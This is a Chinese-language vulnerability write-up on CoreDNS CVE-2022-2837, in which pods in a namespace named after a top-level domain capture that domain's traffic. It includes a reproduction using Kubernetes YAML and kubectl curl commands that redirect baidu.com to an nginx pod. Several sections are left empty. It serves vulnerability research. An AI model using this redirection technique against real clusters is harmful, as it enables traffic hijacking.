# 漏洞分析

## 一、漏洞基本信息

| Item                        | Details                                          | Note                                        |
|-----------------------------|--------------------------------------------------|---------------------------------------------|
| Project                     | coreDNS                                       |                                             |
| CVE-ID                      | CVE-2022-2837                                  |                                             |
| Vuln's Author               |                                      |     |
| CVSS                        | 6.1 CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |                                             |
| Exploits                    |                                                  |                                             |
| Affect Version              | <= 1.9.3                                      |                                             |
| Fix Version                 |              |                                             |
| Original Report             |                                                  |                                             |
| Fix Commit                  |   |   |
| Introduce Commit            |   |   |
| Publish Date                | 2023-05-04                                       |                                             |
| Introduce Date              |                                        |                                             |


## 二、组件简介
coreDNS为kubernetes重要组件，负责集群中的域名解析服务

## 三、漏洞详情

### 1. 介绍
coreDNS存在一个漏洞，利用该漏洞可以重定向pod中访问顶级域名（TLD）的流量到集群中的另一个pod上

### 2. 影响
该漏洞的利用需要拥有创建Pod、创建Namespace以及创建Service的权限，需要权限较多且较高，且只能重定向顶级域名，无法重定向二级域名，故影响很有限，官方也未进行修复

## 四、防御


## 五、漏洞复现

### 1. 复现环境
- 创建`com`Namespace并在该Namespace下创建Pod和Service
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: com 
---
apiVersion: v1
kind: Pod 
metadata:
  name: poc 
  namespace: com 
  labels:
    app: test-app
spec:
  containers:
  - name: nginx
    image: nginx
    ports:
    - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: baidu
  namespace: com 
spec:
  selector:
    app: test-app 
  ports:
  - name: http
    port: 80
    protocol: TCP 
---
apiVersion: v1
kind: Pod 
metadata:
  name: test
  namespace: com 
spec:
  containers:
  - image: ubuntu
    name: test
    command: ["sleep"]
    args: ["10000"]
```
- 拷贝`curl`到`test`Pod中
```
kubectl cp curl-amd64 test:/ -n com
kubectl exec -n com test -- chmod +x /curl-amd64
```
- 在`test`Pod中访问`baidu.com`
```
kubectl exec -n com test -- /curl-amd64 -s http://baidu.com
```
- 会发现`baidu.com`的流量被解析到了`poc`Pod中
```html
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

## 六、漏洞分析

### 1. 原始特性分析

### 2. 调用链分析

### 3. 漏洞分析


## 七、漏洞修复分析


## 八、漏洞挖掘方法与过程

## 九、同类问题挖掘方法

### 设计实现层

### Fuzz

### codeql

## 十、时间线

